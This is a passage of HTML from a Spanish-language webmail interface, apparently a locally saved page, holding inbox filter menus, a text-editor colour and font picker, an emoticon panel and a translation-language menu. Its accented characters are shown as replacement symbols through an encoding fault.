                           class="menulink">&nbsp;<img width="16px" height="16px" class="QInboxViewChk" qvindex="13"
                                                       id="QInboxViewChkImg13"
                                                       style="vertical-align:middle; padding-right:5px;"
                                                       src="./index_files/trans.png"><span id="InboxQView12">Del remitente</span></a>
                        <!-- uad_korney imap begin-->
                        <a id="QickViewsOpenInbox9" href="JavaScript:fnOpenInboxQickView(9)"
                           onmouseover="fnQTitleInboxQickView(9,true)" onmouseleave="fnQTitleInboxQickView(9,false)"
                           onclick="event.stopPropagation();" class="menulink">&nbsp;<img width="16px" height="16px"
                                                                                          class="QInboxViewChk"
                                                                                          qvindex="9"
                                                                                          id="QInboxViewChkImg9"
                                                                                          style="vertical-align:middle; padding-right:5px;"
                                                                                          src="./index_files/trans.png"><span
                                id="InboxQView9">Mis contactos</span></a>
                        <a id="QickViewsOpenInbox10" href="JavaScript:fnOpenInboxQickView(10)"
                           onmouseover="fnQTitleInboxQickView(10,true)" onmouseleave="fnQTitleInboxQickView(10,false)"
                           onclick="event.stopPropagation();" class="menulink" style="display:none">&nbsp;<img
                                width="16px" height="16px" class="QInboxViewChk" qvindex="10" id="QInboxViewChkImg10"
                                style="vertical-align:middle; padding-right:5px;" src="./index_files/trans.png"><span
                                id="InboxQView10">Directorio de la Compa��a</span></a>
                        <a id="QickViewsOpenInbox11" href="JavaScript:fnOpenInboxQickView(11)"
                           onmouseover="fnQTitleInboxQickView(11,true)" onmouseleave="fnQTitleInboxQickView(11,false)"
                           onclick="event.stopPropagation();" class="menulink">&nbsp;<img width="16px" height="16px"
                                                                                          class="QInboxViewChk"
                                                                                          qvindex="11"
                                                                                          id="QInboxViewChkImg11"
                                                                                          style="vertical-align:middle; padding-right:5px;"
                                                                                          src="./index_files/trans.png"><span
                                id="InboxQView11">Otros</span></a>
                        <!-- uad_korney imap end-->
                    </div>
                    <div id="MSLineCustomResponses" class="MSLine"></div>
                    <a href="JavaScript:fnOpenInboxQickView(1)" onmouseover="fnQTitleInboxQickView(1,true)"
                       onmouseleave="fnQTitleInboxQickView(1,false)" onclick="event.stopPropagation();"
                       class="menulink">&nbsp;<img width="16px" height="16px" class="QInboxViewChk" qvindex="1"
                                                   id="QInboxViewChkImg1"
                                                   style="vertical-align:middle; padding-right:5px;"
                                                   src="./index_files/trans.png"><span id="InboxQView1">Sin leer</span></a>
                    <a href="JavaScript:fnOpenInboxQickView(2)" onmouseover="fnQTitleInboxQickView(2,true)"
                       onmouseleave="fnQTitleInboxQickView(2,false)" onclick="event.stopPropagation();"
                       class="menulink">&nbsp;<img width="16px" height="16px" class="QInboxViewChk" qvindex="2"
                                                   id="QInboxViewChkImg2"
                                                   style="vertical-align:middle; padding-right:5px;"
                                                   src="./index_files/trans.png"><span id="InboxQView2">Favoritos</span></a>
                    <a href="JavaScript:fnMultiInboxQickViewMoreOpt()" id="QickViewMoreOptLink"
                       onclick="event.stopPropagation();" title="M�s filtros..." class="menulink">&nbsp;<img
                            width="16px" height="16px" class="QInboxViewChk"
                            style="vertical-align:middle; padding-right:5px;"
                            src="./index_files/trans.png"><span>M�s...</span></a>
                    <div style="display:none" id="QickViewsMoreOpt">
                        <a href="JavaScript:fnOpenInboxQickView(3)" onmouseover="fnQTitleInboxQickView(3,true)"
                           onmouseleave="fnQTitleInboxQickView(3,false)" onclick="event.stopPropagation();"
                           class="menulink">&nbsp;<img width="16px" height="16px" class="QInboxViewChk" qvindex="3"
                                                       id="QInboxViewChkImg3"
                                                       style="vertical-align:middle; padding-right:5px;"
                                                       src="./index_files/trans.png"><span
                                id="InboxQView3">Con adjuntos</span></a>
                        <a href="JavaScript:fnOpenInboxQickView(4)" onmouseover="fnQTitleInboxQickView(4,true)"
                           onmouseleave="fnQTitleInboxQickView(4,false)" onclick="event.stopPropagation();"
                           class="menulink">&nbsp;<img width="16px" height="16px" class="QInboxViewChk" qvindex="4"
                                                       id="QInboxViewChkImg4"
                                                       style="vertical-align:middle; padding-right:5px;"
                                                       src="./index_files/trans.png"><span id="InboxQView4">Ayer</span></a>
                        <a href="JavaScript:fnOpenInboxQickView(5)" onmouseover="fnQTitleInboxQickView(5,true)"
                           onmouseleave="fnQTitleInboxQickView(5,false)" onclick="event.stopPropagation();"
                           class="menulink">&nbsp;<img width="16px" height="16px" class="QInboxViewChk" qvindex="5"
                                                       id="QInboxViewChkImg5"
                                                       style="vertical-align:middle; padding-right:5px;"
                                                       src="./index_files/trans.png"><span id="InboxQView5">La semana pasada</span></a>
                        <a href="JavaScript:fnOpenInboxQickView(6)" onmouseover="fnQTitleInboxQickView(6,true)"
                           onmouseleave="fnQTitleInboxQickView(6,false)" onclick="event.stopPropagation();"
                           class="menulink" style="display:none">&nbsp;<img width="16px" height="16px"
                                                                            class="QInboxViewChk" qvindex="6"
                                                                            id="QInboxViewChkImg6"
                                                                            style="vertical-align:middle; padding-right:5px;"
                                                                            src="./index_files/trans.png"><span
                                id="InboxQView6">Anytime</span></a>
                    </div>
                    <div id="MSLineCustomResponses" class="MSLine"></div>
                    <a href="JavaScript:fnMultiInboxQickView()" onclick="event.stopPropagation()" class="menulink">&nbsp;<input
                            id="QInboxViewChkMulti" checked="checked" type="checkbox" value="ON"
                            style="position: relative; top: 1.5px" onclick="fnMultiInboxQickView()"><span
                            id="InboxQViewM"> Permitir m�ltiples filtros</span></a>

                    <div onclick="event.stopPropagation();" class="menulink"
                         style="text-align:center; padding-top:10px " onmouseover="fnQTitleInboxQickView(300,true)"
                         onmouseleave="fnQTitleInboxQickView(300,false)">
                        <a class="yui3-button" href="JavaScript:fnNewInboxQickView(false)" style="width:50%">A�adir</a>&nbsp;
                        <a class="yui3-button" href="JavaScript:fnNewInboxQickView(true);"
                           style="display:none">Hecho</a>
                        <a class="yui3-button" href="JavaScript:fnLoadMailFilters()" style="display:none">Load</a>
                    </div>

                </td>
                <td id="" valign="top"
                    style="font-size: 12px;  border-left:1px solid #e0e0e0; padding-left:10px;  padding-top:4px; width:300px; line-height:20px"
                    onclick="document.getElementById(&#39;mPOPOptFiltersFromEmails&#39;).style.visibility = &#39;hidden&#39;; event.stopPropagation();">
                    <div id="QInboxQickViewTitle0" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Probar todos, conservar lo que sirve</div>
                        Probar todas las nuevas visualizaciones de la bandeja de entrada para ver cu�l es m�s adecuada.
                        Siempre puedes cambiarla de nuevo si cambia de parecer.
                    </div>
                    <div id="QInboxQickViewTitle8" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Para m�</div>
                        Ver solo mensajes estando usted en l�nea
                    </div>
                    <div id="QInboxQickViewTitle7" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">yo incluido</div>
                        Ver solo mensajes estando usted y los otros en l�nea
                    </div>
                    <div id="QInboxQickViewTitle9" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Mis contactos</div>
                        Ver solo mensajes de su lista de contactos personal
                    </div>
                    <div id="QInboxQickViewTitle10" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Directorio de la Compa��a</div>
                        Ver solo mensajes de gente del Directorio de la Compa��a
                    </div>
                    <div id="QInboxQickViewTitle11" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Otros</div>
                        Ver solo mensajes de gente que no est� en sus contactos.
                    </div>
                    <div id="QInboxQickViewTitle13" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">

                            Del remitente
                        </div>
                        Ver todos los mensajes enviados por un remitente espec�fico.<br><br>Agregar todos las
                        direcciones de correo que pertenecen a esta persona para m�ximos resultados.
                        <br><br>
                        <div>Nombre del remitente</div>
                        <div style="padding-top:3px"><input id="txtFilterFromEmailsName" class="clearable" type="text"
                                                            style="color: rgb(53, 59, 68); display: inline-block; width: 295px; border: 1px #E5E5E5 solid; font-size: 12px; font-family: Arial,Helvetica,sans-serif; height:20px; line-height:20px"
                                                            autocomplete="false" spellcheck="false" value=""></div>
                        <div style="padding-top:5px">Direcciones de correo electr�nico</div>
                        <div style="padding-top:3px"
                             title="Escriba una direcci�n de correo electr�nico aqu�, luego presione Entrar para agregar">
                            <input title="Escriba una direcci�n de correo electr�nico aqu�, luego presione Entrar para agregar"
                                   id="txtFilterFromEmails" class="clearable" type="text"
                                   style="color: rgb(53, 59, 68); display: inline-block; width: 295px; border: 1px #E5E5E5 solid; font-size: 12px; font-family: Arial,Helvetica,sans-serif; height:20px; line-height:20px"
                                   autocomplete="false" spellcheck="false" value=""
                                   onkeyup="fnCheckFilterFromEmails(this,event);"
                                   onchange="fnCheckFilterFromEmailsPOP(this)" dir="ltr"
                                   onkeydown="fnrteKeyDownFilterFromEmails(this,event)"
                                   onfocus="fnSetRTEEmailFocus(this)" onblur="fnrtFilterAutoComBlur()"></div>
                        <div id="divFilterFromEmails" style="padding-top:3px"></div>
                    </div>
                    <div id="QInboxQickViewTitle12" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Nota personal</div>
                        �Se env�a notas a usted mismo?&nbsp;&nbsp; Entonces use este filtro para ver los mensajes que se
                        envi�.
                    </div>
                    <div id="QInboxQickViewTitle1" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Sin leer</div>
                        Ver solo mensajes no le�dos
                    </div>
                    <div id="QInboxQickViewTitle2" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Favoritos</div>
                        Ver solo mensajes marcados como favoritos
                    </div>
                    <div id="QInboxQickViewTitle3" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Con adjuntos</div>
                        Ver solo mensajes con adjunto
                    </div>
                    <div id="QInboxQickViewTitle4" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Ayer</div>
                        Ver solo mensajes recibidos ayer
                    </div>
                    <div id="QInboxQickViewTitle5" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">La semana pasada</div>
                        Ver solo mensajes recibidos la semana pasada
                    </div>
                    <div id="QInboxQickViewTitle6" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Anytime</div>
                        View only messages received during a certain period of time.
                    </div>

                    <div id="QInboxQickViewTitle300" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Confirmaci�n</div>
                        Haga clic en <b>A�adir</b> para crear un filtro. &amp;Nbsp&nbsp; Puede crear tantos filtros como
                        necesite.<br><br><img width="16px" height="16px"
                                              style="vertical-align:middle; float: left; margin-right:3px; margin-bottom:20px"
                                              src="./index_files/info_icon&amp;16_yellow.png">&nbsp;Puede quitar
                        cualquier filtro haciendo clic en el icono <b>X</b> situado junto a �l.
                    </div>
                    <div id="QInboxQickViewTitle3001" style="display:none" class="QInboxViewTitle">
                        <div style="padding-bottom:5px; font-weight:bold">Confirmaci�n</div>
                    </div>
                </td>
            </tr>
            </tbody>
        </table>

    </div>


    <div id="mQuickRTMenuOpt" style="display:none; width:167px; min-width:169px">
        <a href="JavaScript:fnQuickRTMoreAct(0)" class="menulink">&nbsp;Contestar a todos</a>
        <a href="JavaScript:fnQuickRTMoreAct(1)" class="menulink">&nbsp;Reenviar</a>
        <div class="MSLine"></div>
        <a href="JavaScript:fnQuickRTMoreAct(2)" class="menulink">&nbsp;Redactar respuesta</a>
        <a href="JavaScript:fnQuickRTMoreAct(4)" class="menulink">&nbsp;Revisar la ortograf�a</a>
        <div class="MSLine"></div>
        <a href="JavaScript:fnQuickRTMoreAct(5)" class="menulink">&nbsp;Ocultar</a>
        <a href="JavaScript:fnQuickRTMoreAct(3)" class="menulink">&nbsp;Cerrar</a>
    </div>


    <div id="mRTEColorPicker" style="display:none">
        <table style="border: 0px solid #fff" cellspacing="0" cellpadding="0">
            <tbody>
            <tr>
                <td><a style="background-color: #000" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #444444" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #666666" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #999999" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #CCCCCC" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #EEEEEE" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #F3F3F3" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #ffffff" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
            </tr>
            <tr>
                <td><a style="background-color: #FF0000" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #FF9900" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #FFFF00" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #00FF00" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #00FFFF" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #0000FF" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #9900FF" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #FF00FF" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
            </tr>
            <tr>
                <td><a style="background-color: #F4CCCC" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #FCE5CD" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #FFF2CC" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #D9EAD3" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #D0E0E3" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #CFE2F3" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #D9D2E9" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #EAD1DC" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
            </tr>
            <tr>
                <td><a style="background-color: #EA9999" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #F9CB9C" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #FFE599" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #B6D7A8" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #A2C4C9" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #9FC5E8" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #B4A7D6" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #D5A6BD" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
            </tr>
            <tr>
                <td><a style="background-color: #E06666" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #F6B26B" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #FFD966" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #93C47D" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #76A5AF" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #6FA8DC" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #8E7CC3" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #C27BA0" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
            </tr>
            <tr>
                <td><a style="background-color: #CC0000" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #E69138" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #F1C232" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #6AA84F" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #45818E" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #3D85C6" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #674EA7" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #A64D79" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
            </tr>
            <tr>
                <td><a style="background-color: #990000" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #B45F06" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #BF9000" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #38761D" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #134F5C" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #0B5394" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #351C75" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #741B47" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
            </tr>
            <tr>
                <td><a style="background-color: #660000" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #783F04" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #7F6000" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #274E13" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #0C343D" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #073763" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #20124D" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
                <td><a style="background-color: #4C1130" class="ColorPikr" onclick="fnRTEChangeColor(this)"
                       href="JavaScript:"></a></td>
            </tr>
            </tbody>
        </table>

    </div>

    <div id="mRTEFontPicker" style="display:none">
        <a href="JavaScript:fnRTEUpdateFont(&#39;Arial&#39;)" class="menulink" style="font-family:Arial !important">Arial</a>
        <a href="JavaScript:fnRTEUpdateFont(&#39;Sans Serif&#39;)" class="menulink"
           style="font-family:sans-serif !important">Sans Serif</a>
        <a href="JavaScript:fnRTEUpdateFont(&#39;Tahoma&#39;)" class="menulink" style="font-family:Tahoma !important">Tahoma</a>
        <a href="JavaScript:fnRTEUpdateFont(&#39;Verdana&#39;)" class="menulink" style="font-family:Verdana !important">Verdana</a>
        <a href="JavaScript:fnRTEUpdateFont(&#39;Courier New&#39;)" class="menulink"
           style="font-family:&#39;Courier New&#39; !important">Courier New</a>
        <a href="JavaScript:fnRTEUpdateFont(&#39;Georgia&#39;)" class="menulink" style="font-family:Georgia !important">Georgia</a>
        <a href="JavaScript:fnRTEUpdateFont(&#39;Times New Roman&#39;)" class="menulink"
           style="font-family:&#39;Times New Roman&#39; !important">Times New Roman</a>
        <a href="JavaScript:fnRTEUpdateFont(&#39;Impact&#39;)" class="menulink" style="font-family:Impact !important">Impact</a>
        <a href="JavaScript:fnRTEUpdateFont(&#39;Comic Sans MS&#39;)" class="menulink"
           style="font-family:&#39;Comic Sans MS&#39; !important">Comic Sans MS</a>
    </div>

    <div id="mRTEFontSizePicker" style="display:none">
        <a href="JavaScript:fnRTEUpdateFontSize(&#39;1&#39;)" class="menulink"
           style="font-family:Arial !important; font-size:small !important">Peque�o</a>
        <a href="JavaScript:fnRTEUpdateFontSize(&#39;2&#39;)" class="menulink"
           style="font-family:Arial !important; font-size:medium !important">Normal</a>
        <a href="JavaScript:fnRTEUpdateFontSize(&#39;3&#39;)" class="menulink"
           style="font-family:Arial !important; font-size:large !important; display:none">3</a>
        <a href="JavaScript:fnRTEUpdateFontSize(&#39;4&#39;)" class="menulink"
           style="font-family:Arial !important; font-size:20px !important">Grande</a>
        <a href="JavaScript:fnRTEUpdateFontSize(&#39;5&#39;)" class="menulink"
           style="font-family:Arial !important; font-size:x-large !important; display:none">5</a>
        <a href="JavaScript:fnRTEUpdateFontSize(&#39;6&#39;)" class="menulink"
           style="font-family:Arial !important; font-size:xx-large !important">Enorme</a>
    </div>

    <div id="mRTEEmoticonPicker" style="display:none; width:520px" onclick="event.stopPropagation();">
        <div style="width:100%; text-align:left; clear:both; padding-top:7px; padding-bottom:7px">
            <a class="SmallTabSpace" style="width:10px">&nbsp;</a>
            <div style="float:left"><a id="smallTabEmoticon0" class="SmallTab SmallTabSelected"
                                       href="JavaScript:fnEmoticontabs(0)">&nbsp;Emoticon&nbsp;</a><a
                    class="SmallTabSpace">&nbsp;</a></div>
            <div style="float:left"><a id="smallTabEmoticon1" class="SmallTab" href="JavaScript:fnEmoticontabs(1)">&nbsp;Adhesivos&nbsp;</a><a
                    class="SmallTabSpace">&nbsp;</a></div>
            <div style="float:left"><a id="smallTabEmoticon2" class="SmallTab" href="JavaScript:fnEmoticontabs(2)">&nbsp;Emojify&nbsp;</a><a
                    class="SmallTabSpace">&nbsp;</a></div>
            <div style="width:100%; clear:both"></div>
        </div>
        <div style="width:100%; height:330px; overflow-y: auto; overflow-x: hidden; max-height: 330px">
            <div id="SmallTabHTML0" style="display:none">Loading...</div>
            <div id="SmallTabHTML1" style="display:none">Loading...</div>
            <div id="SmallTabHTML2" style="display:none">Loading...</div>
        </div>
    </div>

    <div id="mRTESignPicker"
         style="display:none; width:330px; overflow-y: auto; overflow-x: hidden; max-height: 370px"></div>

    <div id="mRTETranslate" style="display:none; width:400px; overflow-y: auto; overflow-x: hidden; max-height: 390px;">
        <a href="JavaScript:fnRTESelectTrans(0)" class="menulink">&nbsp;<input id="rdbRTETranslate0" value="none_none"
                                                                               name="rdbRTETranslate" type="radio">Sin
            traducci�n</a>
        <div id="mNavDirsOptMenudivide" class="MSLine"></div>


        <a href="JavaScript:fnRTESelectTrans(19)" class="menulink">&nbsp;<input id="rdbRTETranslate19"
                                                                                value="Spanish_English"
                                                                                name="rdbRTETranslate" type="radio">Espa�ol
            a Ingl�s</a>
        <a href="JavaScript:fnRTESelectTrans(20)" class="menulink">&nbsp;<input id="rdbRTETranslate20"
                                                                                value="Spanish_Italian"
                                                                                name="rdbRTETranslate" type="radio">Espa�ol
            a Italiano</a>
        <div id="mNavDirsOptMenudivide" class="MSLine"></div>

        <a href="JavaScript:fnRTESelectTrans(1)" class="menulink">&nbsp;<input id="rdbRTETranslate1"
                                                                               value="English_French"
                                                                               name="rdbRTETranslate" type="radio">Ingl�s
            a Franc�s</a>
        <a href="JavaScript:fnRTESelectTrans(2)" class="menulink">&nbsp;<input id="rdbRTETranslate2"
                                                                               value="English_German"
                                                                               name="rdbRTETranslate" type="radio">Ingl�s
            a Alem�n</a>
        <a href="JavaScript:fnRTESelectTrans(3)" class="menulink">&nbsp;<input id="rdbRTETranslate3"
                                                                               value="English_Italian"
                                                                               name="rdbRTETranslate" type="radio">Ingl�s
            a Italiano</a>
        <a href="JavaScript:fnRTESelectTrans(4)" class="menulink">&nbsp;<input id="rdbRTETranslate4"
                                                                               value="English_Spanish"
                                                                               name="rdbRTETranslate" type="radio">Ingl�s
            a Espa�ol</a>
        <a href="JavaScript:fnRTESelectTrans(5)" class="menulink">&nbsp;<input id="rdbRTETranslate5"
                                                                               value="English_Portuguese"
                                                                               name="rdbRTETranslate" type="radio">Ingl�s
            a Portugu�s</a>
        <a href="JavaScript:fnRTESelectTrans(6)" class="menulink">&nbsp;<input id="rdbRTETranslate6"
                                                                               value="English_Japanese"
                                                                               name="rdbRTETranslate" type="radio">Ingl�s
            a Japon�s</a>
        <a href="JavaScript:fnRTESelectTrans(7)" class="menulink">&nbsp;<input id="rdbRTETranslate7"
                                                                               style="display:none"
                                                                               value="English_Arabic"
                                                                               name="rdbRTETranslate" type="radio">Ingl�s
            a Arabe</a>
        <a href="JavaScript:fnRTESelectTrans(8)" class="menulink">&nbsp;<input id="rdbRTETranslate8"
                                                                               style="display:none"
                                                                               value="English_Swedish"
                                                                               name="rdbRTETranslate" type="radio">Ingl�s
            a Sueco</a>
        <div id="mNavDirsOptMenudivide" class="MSLine"></div>


        <a href="JavaScript:fnRTESelectTrans(9)" class="menulink">&nbsp;<input id="rdbRTETranslate9"
                                                                               value="French_English"
                                                                               name="rdbRTETranslate" type="radio">Franc�s
            a Ingl�s</a>
        <a href="JavaScript:fnRTESelectTrans(10)" class="menulink">&nbsp;<input id="rdbRTETranslate10"
                                                                                value="French_German"
                                                                                name="rdbRTETranslate" type="radio">Franc�s
            a Alem�n</a>
        <a href="JavaScript:fnRTESelectTrans(11)" class="menulink">&nbsp;<input id="rdbRTETranslate11"
                                                                                value="French_Italian"
                                                                                name="rdbRTETranslate" type="radio">Franc�s
            a Italiano</a>
        <div id="mNavDirsOptMenudivide" class="MSLine"></div>
        <a href="JavaScript:fnRTESelectTrans(12)" class="menulink">&nbsp;<input id="rdbRTETranslate12"
                                                                                value="German_English"
                                                                                name="rdbRTETranslate" type="radio">Alem�n
            a Ingl�s</a>
        <a href="JavaScript:fnRTESelectTrans(13)" class="menulink">&nbsp;<input id="rdbRTETranslate13"
                                                                                value="German_French"
                                                                                name="rdbRTETranslate" type="radio">Alem�n
            a Franc�s</a>
        <a href="JavaScript:fnRTESelectTrans(14)" class="menulink">&nbsp;<input id="rdbRTETranslate14"
                                                                                value="German_Italian"
                                                                                name="rdbRTETranslate" type="radio">Alem�n
            a Italiano</a>
        <div id="mNavDirsOptMenudivide" class="MSLine"></div>
        <a href="JavaScript:fnRTESelectTrans(15)" class="menulink">&nbsp;<input id="rdbRTETranslate15"
                                                                                value="Italian_English"
                                                                                name="rdbRTETranslate" type="radio">Italiano
            a Ingl�s</a>
        <a href="JavaScript:fnRTESelectTrans(16)" class="menulink">&nbsp;<input id="rdbRTETranslate16"
                                                                                value="Italian_French"
                                                                                name="rdbRTETranslate" type="radio">Italiano
            a Franc�s</a>
        <a href="JavaScript:fnRTESelectTrans(17)" class="menulink">&nbsp;<input id="rdbRTETranslate17"
                                                                                value="Italian_German"
                                                                                name="rdbRTETranslate" type="radio">Italiano
            a Alem�n</a>
        <a href="JavaScript:fnRTESelectTrans(18)" class="menulink">&nbsp;<input id="rdbRTETranslate18"
                                                                                value="Italian_Spanish"
                                                                                name="rdbRTETranslate" type="radio">Italiano
            a Espa�ol</a>
        <div id="mNavDirsOptMenudivide" class="MSLine"></div>
        <a href="JavaScript:fnRTESelectTrans(21)" class="menulink">&nbsp;<input id="rdbRTETranslate21"
                                                                                value="Portuguese_English"
                                                                                name="rdbRTETranslate" type="radio">Portugu�s
            a Ingl�s</a>
        <div id="mNavDirsOptMenudivide" class="MSLine"></div>
        <a href="JavaScript:fnRTESelectTrans(22)" class="menulink">&nbsp;<input id="rdbRTETranslate22"
                                                                                value="Japanese_English"
                                                                                name="rdbRTETranslate" type="radio">Japon�s
            a Ingl�s</a>
    </div>

    <div id="mTranslatorOptMenu" style="display:none; overflow:hidden">
        <a href="JavaScript:fnTranslatorBoxSelect(0)" class="menulink">&nbsp;<input type="checkbox" id="TranslatorOpt0"
                                                                                    onclick="fnTranslatorBoxSelect(0); fnCancelClick(event)"
                                                                                    value="authormale">Autor
            masculino</a>
        <a href="JavaScript:fnTranslatorBoxSelect(1)" class="menulink">&nbsp;<input type="checkbox" id="TranslatorOpt1"
                                                                                    onclick="fnTranslatorBoxSelect(1); fnCancelClick(event)"
                                                                                    value="recipientmale">Destinatario
            masculino</a>
        <a href="JavaScript:fnTranslatorBoxSelect(2)" class="menulink">&nbsp;<input type="checkbox" id="TranslatorOpt2"
